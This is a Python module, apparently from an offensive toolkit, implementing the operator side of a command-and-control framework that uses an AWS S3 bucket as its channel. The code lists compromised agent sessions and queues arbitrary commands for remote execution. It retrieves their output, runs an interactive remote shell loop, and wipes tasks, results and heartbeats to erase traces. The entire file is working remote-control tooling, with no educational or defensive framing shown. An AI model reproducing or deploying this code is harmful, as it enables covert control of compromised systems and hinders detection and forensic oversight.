"""
Cloud C2 Operator - Operator interface for managing agents
"""

import json
import secrets
from datetime import datetime
from .c2 import CloudC2


class CloudC2Operator:
    """
    Cloud C2 Operator
    Interface for managing agents and issuing commands
    """
    
    def __init__(self, bucket_name, aws_access_key, aws_secret_key, region='us-east-1'):
        """
        Initialize Cloud C2 Operator
        
        Args:
            bucket_name (str): S3 bucket name
            aws_access_key (str): AWS access key
            aws_secret_key (str): AWS secret key
            region (str): AWS region
        """
        self.cloud = CloudC2(bucket_name, aws_access_key, aws_secret_key, region)
    
    def list_sessions(self, include_metadata=False):
        """
        List active sessions
        
        Args:
            include_metadata (bool): Include session metadata
        
        Returns:
            list: List of session IDs or session data
        """
        if include_metadata:
            # List from sessions/ directory
            session_keys = self.cloud.list_objects(prefix='sessions/')
            sessions = []
            
            for key in session_keys:
                data = self.cloud.download_object(key)
                if data:
                    try:
                        session = json.loads(data)
                        
                        # Add heartbeat info
                        session_id = session.get('session_id')
                        heartbeat_key = f"heartbeats/{session_id}.txt"
                        last_seen = self.cloud.download_object(heartbeat_key)
                        if last_seen:
                            session['last_seen'] = last_seen
                        
                        sessions.append(session)
                    except:
                        continue
            
            return sessions
        else:
            # Quick list from results
            results = self.cloud.list_objects(prefix='results/')
            
            sessions = set()
            for key in results:
                parts = key.split('/')
                if len(parts) >= 2:
                    session_info = parts[1].split('-')
                    if session_info:
                        sessions.add(session_info[0])
            
            return list(sessions)
    
    def issue_command(self, session_id, command):
        """
        Issue command to agent
        
        Args:
            session_id (str): Target session ID
            command (str): Command to execute
        
        Returns:
            str: Task ID or None if failed
        """
        task_id = secrets.token_hex(16)
        
        task_data = {
            'task_id': task_id,
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        
        task_key = f"tasks/{session_id}.json"
        
        if self.cloud.upload_object(task_key, json.dumps(task_data)):
            print(f"[+] Task created: {task_id}")
            print(f"[+] Command: {command}")
            print(f"[*] Waiting for agent to retrieve...")
            return task_id
        else:
            print(f"[-] Failed to create task")
            return None
    
    def get_results(self, session_id=None, task_id=None, delete_after_read=False):
        """
        Get command results
        
        Args:
            session_id (str): Filter by session ID
            task_id (str): Filter by task ID
            delete_after_read (bool): Delete results after reading
        
        Returns:
            list: List of result objects
        """
        if session_id:
            result_keys = self.cloud.list_objects(prefix=f'results/{session_id}')
        else:
            result_keys = self.cloud.list_objects(prefix='results/')
        
        results = []
        
        for key in result_keys:
            data = self.cloud.download_object(key)
            if data:
                try:
                    result = json.loads(data)
                    
                    # Filter by task_id if specified
                    if task_id and result.get('task_id') != task_id:
                        continue
                    
                    results.append(result)
                    
                    # Delete if requested
                    if delete_after_read:
                        self.cloud.delete_object(key)
                
                except json.JSONDecodeError:
                    continue
        
        return results
    
    def get_session_info(self, session_id):
        """
        Get detailed session information
        
        Args:
            session_id (str): Session ID
        
        Returns:
            dict: Session information or None
        """
        session_key = f"sessions/{session_id}.json"
        data = self.cloud.download_object(session_key)
        
        if data:
            try:
                session = json.loads(data)
                
                # Add heartbeat
                heartbeat_key = f"heartbeats/{session_id}.txt"
                last_seen = self.cloud.download_object(heartbeat_key)
                if last_seen:
                    session['last_seen'] = last_seen
                
                # Count pending tasks
                task_key = f"tasks/{session_id}.json"
                session['has_pending_task'] = self.cloud.object_exists(task_key)
                
                # Count results
                results = self.cloud.list_objects(prefix=f'results/{session_id}')
                session['result_count'] = len(results)
                
                return session
            except:
                return None
        
        return None
    
    def cleanup(self, session_id=None):
        """
        Clean up C2 data
        
        Args:
            session_id (str): Clean specific session or all if None
        """
        if session_id:
            # Clean specific session
            print(f"[*] Cleaning up session: {session_id}")
            
            count = 0
            count += self.cloud.delete_all_objects(prefix=f'tasks/{session_id}')
            count += self.cloud.delete_all_objects(prefix=f'results/{session_id}')
            count += self.cloud.delete_all_objects(prefix=f'sessions/{session_id}')
            count += self.cloud.delete_all_objects(prefix=f'heartbeats/{session_id}')
            
            print(f"[+] Deleted {count} objects")
        else:
            # Clean all
            print(f"[*] Cleaning up all C2 data")
            
            count = 0
            count += self.cloud.delete_all_objects(prefix='tasks/')
            count += self.cloud.delete_all_objects(prefix='results/')
            count += self.cloud.delete_all_objects(prefix='sessions/')
            count += self.cloud.delete_all_objects(prefix='heartbeats/')
            
            print(f"[+] Deleted {count} objects")
    
    def interactive_shell(self, session_id):
        """
        Interactive shell for session
        
        Args:
            session_id (str): Target session ID
        """
        print(f"[*] Interactive shell for session: {session_id}")
        print(f"[*] Type 'exit' to quit")
        print()
        
        while True:
            try:
                command = input(f"{session_id}> ").strip()
                
                if not command:
                    continue
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                # Issue command
                task_id = self.issue_command(session_id, command)
                
                if task_id:
                    print(f"[*] Waiting for result...")
                    
                    # Poll for result
                    import time
                    for _ in range(60):  # Wait up to 60 seconds
                        time.sleep(1)
                        
                        results = self.get_results(session_id=session_id, task_id=task_id)
                        
                        if results:
                            print(results[0]['output'])
                            break
                    else:
                        print(f"[-] Timeout waiting for result")
            
            except KeyboardInterrupt:
                print("\n[!] Shell interrupted")
                break
            except EOFError:
                break